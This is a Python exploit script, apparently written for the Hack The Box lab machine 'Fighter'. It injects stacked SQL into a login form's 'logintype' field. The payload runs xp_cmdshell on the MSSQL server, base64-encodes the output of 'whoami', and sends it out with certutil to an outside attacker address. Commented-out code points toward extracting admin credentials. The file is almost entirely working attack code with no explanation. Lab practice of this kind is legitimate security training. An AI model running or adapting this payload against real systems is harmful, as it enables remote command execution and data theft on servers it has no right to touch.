import requests
import argparse
import base64
parser = argparse.ArgumentParser(description='Blind SQL Injection Boolean (Fighter hackthebox)')

parser.add_argument("--username", default=None, type=str, help="Your street username")
parser.add_argument("--password", default=None, type=str, help="Your street password")
args = parser.parse_args()


def run_injection(session):
    payload = "2;"
    payload += "declare @r varchar(6120),@cmdOutput varchar(6120);"
    payload += "declare @res TABLE(line varchar(max));"
    payload += "insert into @res exec Xp_cmdshell 'whoami';"
    payload += "set @cmdOutput=(SELECT CAST((select stuff((select cast(char(10) as varchar(max)) + line FROM @res for xml path('')), 1, 1, '')) as varbinary(max)) FOR XML PATH(''), BINARY BASE64);"
    payload += "set @r=concat('certutil -urlcache -f http://10.10.14.24/',@cmdOutput);"
    payload += "exec Xp_cmdshell @r;"
    payload += "--"

    # Data for login
    login = {
        'B1': 'LogIn',
        # 'logintype': "1 AND ISNULL(ASCII(SUBSTRING((SELECT @@version LIMIT 0,1)),"+str(limit)+",1)),0)>"+str(char),
        'logintype': payload,
        'username': "admin",
        'rememberme': 'ON',
        'password': "admin",
    }

    response = session.post('http://members.streetfighterclub.htb/old/verify.asp', data=login, allow_redirects=False)
    print(session.cookies)


def main():
    login = {
        'B1': 'LogIn',
        'logintype': "1",
        'username': "admin",
        'password': "admin",
    }
    session = requests.session()
    session.post('http://members.streetfighterclub.htb/old/verify.asp', data=login)
    run_injection(session)

    # admin_username = run_injection(session, "username", 20)
    # admin_password = run_injection(session, "password", 65)
    #
    # admin_password = ''.join(chr(i) for i in admin_password)
    # print("sha1:" + admin_password.split("/")[0])
    # admin_username = ''.join(chr(i) for i in admin_username)
    # print("username:" + admin_username.split("/")[0])


main()
